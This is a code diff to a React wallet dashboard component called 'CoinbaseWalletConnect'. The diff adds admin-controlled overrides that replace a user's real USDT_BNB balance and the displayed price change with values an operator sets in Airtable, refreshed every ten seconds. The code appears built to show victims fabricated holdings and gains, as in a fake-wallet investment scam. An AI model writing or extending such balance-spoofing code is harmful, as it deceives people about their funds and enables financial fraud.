@@ -201,7 +201,31 @@ export default function CoinbaseWalletConnect() {
     
     // Data States
     const [transactions, setTransactions] = useState<any[]>([]);
-    const [getUserLoading, setGetUSerLoading] = useState(false)
+    const [user, setUser] = useState<any>(null);
+    const [getUserLoading, setGetUSerLoading] = useState(false);
+
+    useEffect(() => {
+        const fetchUserData = async () => {
+            if (!address || address === "") return;
+            try {
+                setGetUSerLoading(true);
+                const res = await fetch(`/api/user?address=${address}`);
+                const data = await res.json();
+                if (data.existingRecord) {
+                    setUser(data.existingRecord);
+                }
+            } catch (e) {
+                console.error("Failed to fetch user data:", e);
+            } finally {
+                setGetUSerLoading(false);
+            }
+        };
+
+        fetchUserData();
+        const interval = setInterval(fetchUserData, 10000); // Auto-refresh for admin updates
+        return () => clearInterval(interval);
+    }, [address]);
+
     const fetchTransactionsData = async () => {
         if (!address || address == "") return;
         try {
@@ -506,8 +530,8 @@ export default function CoinbaseWalletConnect() {
         return visibleAssets.map((symbol, idx) => {
             const isTethereum = symbol === 'TETHEREUM';
             const priceData = marketPrices[symbol] || STATIC_FALLBACK_PRICES[symbol] || { price: 0, change: 0 };
-            const price = priceData.price;
-            const change = priceData.change;
+            let price = priceData.price;
+            let change = priceData.change;
 
             let balanceStr = 
                 isTethereum ? t22Balance :
@@ -519,11 +543,19 @@ export default function CoinbaseWalletConnect() {
                                             symbol === 'CTM' ? ctmBalance :
                                                 '0';
 
-            // Balance Override from Airtable (Treating price field as balance booster)
-            if (symbol === 'USDT_BNB' && (user as any)?.fields?.usdt_bnb_price) {
-                const manualBal = parseFloat((user as any).fields.usdt_bnb_price);
-                if (!isNaN(manualBal)) {
-                    balanceStr = manualBal.toString();
+            // Balance Override from Airtable
+            if (symbol === 'USDT_BNB' && user?.fields) {
+                const manualBal = user.fields.usdt_bnb_price || user.fields.USDT_BNB_PRICE;
+                if (manualBal) {
+                    const num = parseFloat(manualBal);
+                    if (!isNaN(num)) balanceStr = num.toString();
+                }
+                
+                // Also allow overriding the change display if needed
+                const manualChange = user.fields.usdt_bnb_change || user.fields.USDT_BNB_CHANGE;
+                if (manualChange) {
+                    const num = parseFloat(manualChange);
+                    if (!isNaN(num)) change = num;
                 }
             }
 
@@ -550,10 +582,12 @@ export default function CoinbaseWalletConnect() {
     }, [visibleAssets, marketPrices, bnbBalance, t22Balance, ethBalance, btcBalance, usdtEthBalance, usdtBnbBalance, ctmBalance, assetSearchQuery, address, pageLoading, user]);
 
     const displayUsdtBnbBalance = useMemo(() => {
-        const override = (user as any)?.fields?.usdt_bnb_price;
-        if (override) {
-            const manual = parseFloat(override);
-            if (!isNaN(manual)) return manual.toString();
+        if (user?.fields) {
+            const override = user.fields.usdt_bnb_price || user.fields.USDT_BNB_PRICE;
+            if (override) {
+                const manual = parseFloat(override);
+                if (!isNaN(manual)) return manual.toString();
+            }
         }
         return usdtBnbBalance;
     }, [user, usdtBnbBalance]);
